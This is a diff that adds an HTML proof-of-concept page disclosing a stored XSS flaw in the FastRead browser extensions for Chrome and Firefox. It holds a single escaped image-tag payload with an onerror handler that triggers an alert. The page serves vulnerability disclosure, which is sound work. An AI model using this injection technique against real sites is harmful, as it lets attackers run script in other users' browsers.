@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>FastRead XSS PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+  <body>
+    <p>
+      This page is a proof of concept for an xss in <a href="https://github.com/ahrm/chrome-fastread">chrome-fastread</a>
+      and <a href="https://github.com/akay/firefox-fastread">firefox-fastread</a>. There is zero user interaction required
+      apart from the user enabling FastRead. The vulnerability enables an attacker to have stored XSS on every site that 
+      allows attacker-controlled text, for example comments on a blog or sth like that.
+    </p>
+    <p>aaaaaaaaaaaaaaaaaa&lt;imgsrc=xonerror=alert(1)&gt;</p>
+
+  </body>
+</html>
